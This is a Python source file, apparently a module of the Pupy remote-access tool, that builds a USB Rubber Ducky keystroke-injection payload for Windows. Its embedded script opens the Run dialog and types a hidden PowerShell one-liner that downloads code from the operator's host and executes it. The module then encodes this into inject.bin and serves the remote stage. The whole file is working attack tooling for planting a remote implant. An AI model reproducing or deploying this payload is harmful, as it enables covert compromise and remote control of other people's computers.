# -*- coding: utf-8 -*-
#Author: @bobsecq
#Contributor(s):

from pupylib.PupyOutput import Success, Error

import subprocess

class rubber_ducky():
    '''
    '''
    TARGET_OS_MANAGED = ['Windows']
    ENCODE_CMD = "java -jar {0}  -i {1}  -l {2} -o {3}" #{0} encode.jar file, {1} rubber ducky script file, {2} layout file, {3} output file
    WINDOWS_SCRIPT = """DELAY 3000\nGUI r\nDELAY 500\nSTRING powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('http://{0}:{1}/p')"\nENTER"""#{0} ip {1} port

    def __init__(self, display, conf, pupy_conf, link_port=8080, targetOs='Windows'):
        '''
        '''
        self.conf = conf
        i=conf["launcher_args"].index("--host")+1
        self.link_ip = conf["launcher_args"][i].split(":",1)[0]
        self.link_port = link_port
        self.pupy_conf = pupy_conf

        self.__loadRubberDuckyConf__()

        self.rubberDuckyScriptFilename = 'rubberDuckyPayload.txt'
        self.rubberDuckyBinFilename = 'inject.bin'

        self.targetOs = targetOs
        self.display = display
        self.unconfigured = False

        if self.targetOs not in self.TARGET_OS_MANAGED:
            self.display(Error('Target OS ({0}) is not valid. It has to be in {1}'.format(
                targetOs, self.TARGET_OS_MANAGED)))

    def createRubberDuckyScriptForWindowsTarget(self):
        '''
        '''
        with open(self.rubberDuckyScriptFilename, 'wb') as w:
            w.write(self.WINDOWS_SCRIPT.format(self.link_ip, self.link_port))

        self.display(Success('Rubber ducky script file generated in {0}'.format(
            self.rubberDuckyScriptFilename)))

    def generateInjectBinFile(self):
        '''
        returns True if no error
        Otherwise returns False
        '''
        rubberDuckyEncodeCmd = self.ENCODE_CMD.format(self.encoderPath, self.rubberDuckyScriptFilename, self.keyboardLayoutPath, self.rubberDuckyBinFilename)
        try:
            output = subprocess.check_output(rubberDuckyEncodeCmd, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell = True)
        except subprocess.CalledProcessError, e:
            self.display(Error('Impossible to generate {0} file with encoder: {1}'.format(
                self.rubberDuckyBinFilename, repr(e.output))))

        except Exception, e:
            self.display(Error('Impossible to generate {0} file with encoder: {1}'.format(
                self.rubberDuckyBinFilename, repr(e))))
            return False

        else:
            self.display(Success('Encoder output: {0}'.format(output)))
            self.display(Success('{0} has been created'.format(repr(self.rubberDuckyBinFilename))))
            return True

    def __loadRubberDuckyConf__(self):
        '''
        '''

        self.encoderPath = self.pupy_conf.get('rubber_ducky', 'encoder_path')
        self.keyboardLayoutPath = self.pupy_conf.get('rubber_ducky', 'default_keyboard_layout_path')

        if self.encoderPath == 'TO_FILL':
            self.unconfigured = True
            self.display(Error('The "encoder_path" value has to be filled in pupy.conf for generating inject.bin'))

        if self.keyboardLayoutPath == 'TO_FILL':
            self.unconfigured = True
            self.display(Error(
                'The "default_keyboard_layout_path" value has to be filled in pupy.conf '
                'for generating inject.bin'))

    def generateAllForOStarget(self):
        '''
        '''

        if self.targetOs == 'Windows' and not self.unconfigured:
            from ps1_oneliner import serve_ps1_payload

            self.createRubberDuckyScriptForWindowsTarget()
            self.generateInjectBinFile()

            self.display(Success('copy/paste inject.bin file on USB rubber ducky device'))
            self.display(Success(
                'You should not pay attention to the following message '
                '(powershell command). This powershell command is embedded in '
                'the inject.bin file generated'))

            serve_ps1_payload(self.display, self.conf, link_ip=self.link_ip)
